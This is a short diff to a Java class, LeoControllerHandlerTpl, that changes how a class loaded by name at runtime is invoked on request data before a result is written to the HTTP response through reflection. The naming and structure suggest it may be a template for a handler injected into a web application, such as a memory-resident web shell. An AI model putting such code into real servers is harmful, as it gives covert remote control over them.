@@ -52,8 +52,12 @@ public class LeoControllerHandlerTpl {
             while ((bytesRead = input.read(buffer)) != -1) {
                 output.write(buffer, 0, bytesRead);
             }
-            Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
-                    .newInstance().equals(output);
+            try {
+                ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
+                        .newInstance()).invoke(null, null, new Object[]{output});
+            } catch (Throwable e) {
+                throw new IllegalStateException("Core invocation failed", e);
+            }
             Object responseOutput = response.getClass().getMethod("getOutputStream")
                     .invoke(response);
             responseOutput.getClass().getMethod("write", byte[].class)
